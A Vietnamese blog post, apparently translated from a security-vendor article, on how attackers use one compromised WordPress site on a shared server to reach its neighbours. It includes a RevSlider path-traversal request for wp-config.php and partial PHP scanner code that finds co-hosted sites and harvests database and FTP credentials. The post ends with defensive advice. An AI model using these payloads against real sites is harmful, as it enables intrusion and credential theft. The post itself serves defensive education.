---
layout: post
title: Hack các trang WordPress trên shared server
---

Một trang web chỉ an toàn như mắt xích yếu nhất trên shared server của nó. Một khi hacker chiếm được quyền truy cập vào một trang trên server, họ có thể dễ dàng xâm nhập vào các trang khác nằm trên cùng máy chủ có cùng quyền hạn. Điều này gọi là `cross-site contamination`. Khi điều tương tự xảy đến với các trang web sử dụng WordPress thì nó càng trở nên nguy hiểm vì các hacker đã nắm rõ cấu trúc core trong lòng bàn tay.

![wordpress](/assets/wordpress.png)

Người dùng WordPress hiểu rằng tập tin `wp-config.php` chứa thông tin chứng thực cơ sở dữ liệu nên việc ngăn người lạ có khả năng đọc tập tin nhạy cảm này là rất quan trọng. Nếu các hacker đánh cắp được những chứng thực cơ sở dữ liệu này, họ sẽ có thể làm những việc ví dụ như: tạo ra các tài khoản quản trị viên mới hoặc chèn dữ liệu spam vào các bài viết.

Có hai điều mà hầu hết các công ty hosting và các chủ trang web thường làm để ngăn chặn những kiểu hack trên:

- Làm cho `wp-config.php` không thể đọc bởi bất cứ ai trừ chủ trang web (và tiến trình máy chủ web). Ví dụ như cấu hình quyền hạn `400` (CHMOD).
- Làm cho các IP từ ngoài không thể kết nối tới cơ sở dữ liệu (chỉ chấp nhận `127.0.0.1` hoặc bên ngoài subnetwork của máy chủ).

Hai bước này giúp bạn tránh khỏi nhiều vấn đề... cho tới khi trang của bạn dính một lỗ hổng `Arbitrary File Download` (tải về tập tin tùy ý).

### Lỗ hổng Arbitrary File Download

Lỗ hổng này cho phép các hacker tạo ra một truy vấn tới trang của bạn và trả lại nội dung của tập tin bất kỳ trên máy chủ của bạn (nếu tiến trình máy chủ web có quyền đọc nó). Ví dụ điển hình nhất về một lỗi như vậy là lỗ hổng bảo mật trong các phiên bản cũ của plugin RevSlider cực kỳ phổ biến dẫn đến việc hàng trăm hàng ngàn các trang web WordPress bị lộ thông tin trong năm 2014.

Đây là một truy vấn thường thấy trong log của các trang web bị hack:

`http://victim.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php`

Hacker đã sử dụng truy vấn này để tải về nội dung của `wp-config.php` và sau đó dùng các thông tin đăng nhập cơ sở dữ liệu để tạo ra các tài khoản admin WordPress.

### Những bước ngăn chặn đó đã không giúp được gì

Thiết lập quyền hạn 400 cho `wp-config.php` có thể ngăn chặn kiểu tấn công này?

Không. Tập tin đã được truy cập bởi tiến trình máy chủ web - nó có quyền đọc tập tin (nếu nó không thì WordPress không thể hoạt động).

Vậy còn về việc chặn các kết nối tới cơ sở dữ liệu từ bên ngoài mạng máy chủ hay thậm chí từ bất cứ máy chủ nào trừ localhost?

Tất nhiên. Sau khi đánh cắp các thông tin đăng nhập cơ sở dữ liệu, hacker không thể nào đăng nhập từ chính máy tính của họ. Vậy là chúng ta an toàn chứ? Thật không may, có một cách giải quyết điều này và chúng tôi thường xuyên thấy các hacker sử dụng nó.

### Shared Server

Các hacker có thể kết nối tới cơ sở dữ liệu của WordPress từ cùng máy chủ (mạng) với chính trang web mà họ muốn hack. Làm sao họ có thể làm điều này nếu như họ chưa từng xâm nhập vào trang web trước đó? Câu trả lời là shared server. Các hacker sử dụng một trang đã bị xâm nhập trước kia để khám phá và hack các trang WordPress khác trên cùng máy chủ.

### Quét các trang bị lỗi bảo mật

Có rất nhiều script phổ biến tận dụng sức mạnh ip của Bing: lệnh để tự động phát hiện các trang bị lỗi trên cùng địa chỉ IP.

Đây là một ví dụ:

```php
$sites = array_map("site", bing("ip:$ip"));
$un = array_unique($sites);
echo "[+] Scanning -> ", $ip, ""."\n";
echo "Found : ".count($sites)." sites\n\n";
foreach($un as $pok){
    $linkof = '/wp-content/themes/vulnerable-theme/css/css.php?files= ../../../../wp-config.php';
    $dn = ($bda) . ($linkof);
    $file = @file_get_contents($dn);
    if(eregi('DB_HOST', $file) and !eregi('FTP_USER', $file) ) {
    echo "[+] Scanning => " . $bda . "\n\n";
    echo "[+] DB NAME : " . findit($file,"DB_NAME', '","');") . "\n\n";
    echo "[+] DB USER : " . findit($file,"DB_USER', '","');") . "\n\n";
    echo "[+] DB PASS : " . findit($file,"DB_PASSWORD', '","');") . "\n\n";
    echo "[+] DB host : " . findit($file,"DB_HOST', '","');") . "\n\n";
...
```

Kịch bản này sử dụng hàm bing() để tìm các trang WordPress đã lập chỉ mục trên máy chủ. Với mỗi trang tìm thấy, nó cố gắng nạp URL sẽ trả về nội dung của tập tin wp-config.php. Nếu trang không bị lỗi thì bước này bị bỏ qua. Tập tin wp-config.php đã lấy được sẽ được phân tích và các thông tin đăng nhập cơ sở dữ liệu của các trang WordPress này giờ đã thuộc về các hacker.

Ngoài các thông tin cơ sở dữ liệu, script tương tự có thể đánh cắp thông tin FTP từ wp-config.php (khi tiến trình máy chủ web không có quyền thay đổi tập tin, các trang sẽ có tùy chọn để cấu hình cập nhật WordPress thông qua FTP).

```php
elseif(eregi('DB_HOST', $file) and eregi('FTP_USER', $file)){
    echo "FTP user : " . findit($file, "FTP_USER','","');") . "\n\n";
    echo "FTP pass : " . findit($file, "FTP_PASS','","');") . "\n\n";
    echo "FTP host : " . findit($file, "FTP_HOST','","');") . "\n\n";
}
```

Do một máy chủ dạng chia sẻ (shared server) có thể lưu trữ hơn một ngàn trang khác nhau nên cơ hội để tìm các trang khác bị lỗi là khá cao. Như bạn có thể thấy, script này cho phép các hacker nhanh chóng thu thập cơ sở dữ liệu, đôi khi là thông tin FTP từ bất cứ trang WordPress nào khác bị lỗi trên cùng máy chủ với trang mà hacker đã có sẵn quyền truy cập.

Với danh sách thông tin cơ sở dữ liệu, họ có thể sử dụng chính trang đã bị hack để chạy các script khác kết nối tới DB. Vì script hoạt động trên cùng máy chủ của các nạn nhân, kết nối này sẽ không bị chặn. Từ đây, các hacker có thể tạo tài khoản admin mới trên mỗi trang bị lỗi hoặc chỉ đơn giản thay đổi giao diện trang bằng cách thay đổi tiêu đề trang của chúng (khi động lực duy nhất của hacker chỉ để khoe trên Zone-H).

### Các cuộc tấn công cấp độ subnetwork (mạng con)

Như bạn có thể biết, một vài nhà cung cấp hosting có các máy chủ cơ sở dữ liệu riêng biệt (dedicated server). Điều này cho phép các trang từ nhiều máy chủ web khác nhau kết nối tới cùng một máy chủ cơ sở dữ liệu. Trong một môi trường như vậy, các máy chủ cơ sở dữ liệu được cấu hình để cho phép nhiều kết nối từ nhiều IP trên cùng mạng con. Điều này khiến cho các cuộc hack hàng loạt sử dụng thông tin cơ sở dữ liệu đánh cắp được thành công hơn nữa. Các hacker chỉ cần một trang web bị xâm nhập trên mỗi mạng con (thay vì một trên mỗi IP) để bắt đầu một cuộc tấn công như vậy.

Trong trường hợp này, script sẽ bắt đầu có dạng như này:

```php
$ip = trim(fgets(STDIN,1024));
$ip = explode('.',$ip);
$ip = $ip[0].'.'.$ip[1].'.'.$ip[2].'.';
for ($i = 0; $i <= 255; $i++) {
    $sites = array_map("site", bing("ip:$ip.$i wordpress"));
    …
```

### Đánh giá các mối đe dọa và bảo vệ trang web của bạn
Như bạn biết, mỗi chuỗi chỉ mạnh như mắt xích yếu nhất của nó. Điều này cũng tương tự với bảo mật web. Chúng tôi luôn nhấn mạnh đến yếu tố cross-contaminations (truyền nhiễm xuyên suốt); khi một trang bị bỏ rơi có thể trở thành nguyên ngân khiến các trang bảo mật tốt và cập nhật bị tấn công lại trên cùng máy chủ web.

Bài viết này cho bạn thấy rằng mắt xích yếu nhất có thể là một trang không thuộc về bạn và rằng bạn chả biết gì về nó - nó chỉ dùng cùng máy chủ như trang của bạn (và hàng ngàn trang khác của bên thứ ba). Trong các trường hợp này, trang của bạn có thể bị hack kể cả khi bạn đã thiết lập quyền hạn cho wp-config.php và cơ sở dữ liệu của bạn không cho phép các kết nối từ bên ngoài.

Tất nhiên, các hacker vẫn cần đánh cắp thông tin cơ sở dữ liệu - điều có thể xảy ra nếu phần mềm mà trang của bạn sử dụng (theme, plugin, bản thân WordPress,...) bị dính lỗ hổng chưa được biết tới hoặc được phát hiện (zero-day). Không có phần mềm nào có thể đảm bảo rằng nó không chứa lỗ hổng bảo mật.

Để ngăn chặn các cuộc tấn công đòn bẩy từ các trang hàng xóm bị xâm nhập, bạn nên loại bỏ càng nhiều mắt xích yếu càng tốt.

- Di chuyển trang của bạn tới một máy chủ riêng, hoặc...
- Vá đầy đủ trang web của bạn để các máy quét lỗ hổng độc hại không thể tìm các lỗ hổng bảo mật trên trang của bạn.

Bất kỳ chiến lược vá lỗi nào cũng nên cân nhắc về các lỗ hổng bảo mật `zero-day` mà các nhà phát triển phần mềm chưa biết tới, và do đó mà chưa có bản vá lỗi nào. Một giải pháp giám sát mạnh mẽ có thể giúp bạn nhanh chóng kiểm soát và phục phồi từ một cuộc lây nhiễm WordPress.

Bạn cũng có thể có lợi từ một Website Firewall cung cấp bản vá và bảo vệ thông minh chống lại các cuộc tấn công dựa trên lỗi bảo mật, bao gồm các lỗ hổng bảo mật zero-day chưa được phát hiện.

ref: https://blog.sucuri.net/2016/09/hacking-wordpress-sites-shared-servers.html

---
